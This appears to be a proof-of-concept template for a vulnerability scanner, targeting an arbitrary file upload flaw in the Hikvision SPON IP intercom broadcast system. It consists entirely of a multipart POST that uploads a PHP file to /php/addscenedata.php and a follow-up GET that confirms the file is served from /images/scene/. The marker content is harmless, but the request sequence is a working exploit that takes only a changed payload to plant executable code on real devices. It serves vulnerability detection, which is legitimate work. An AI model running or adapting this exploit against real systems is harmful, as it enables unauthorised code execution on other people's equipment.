{
        'name': '海康威视SPON IP网络对讲广播系统addscenedata存在任意文件上传',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/php/addscenedata.php',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary4LuoBRpTiVBo9cIQ',
                'Accept-Encoding': 'gzip',
                'Connection': 'close'
            },
            'data': '''------WebKitFormBoundary4LuoBRpTiVBo9cIQ\r\nContent-Disposition: form-data; name="upload"; filename="tt.php"\r\nContent-Type: text/plain\r\n123\r\n------WebKitFormBoundary4LuoBRpTiVBo9cIQ--''',
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': False,
            'text': False
        }},
        {'requests':{
            'method': 'get',
            'payload': '/images/scene/tt.php',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary4LuoBRpTiVBo9cIQ',
                'Accept-Encoding': 'gzip',
                'Connection': 'close'
            },
            'dnslog': False,
            'sqltime': False
        },
        'response': {
            'status_code': 200,
            'text': '123'
        }}
        ]
    }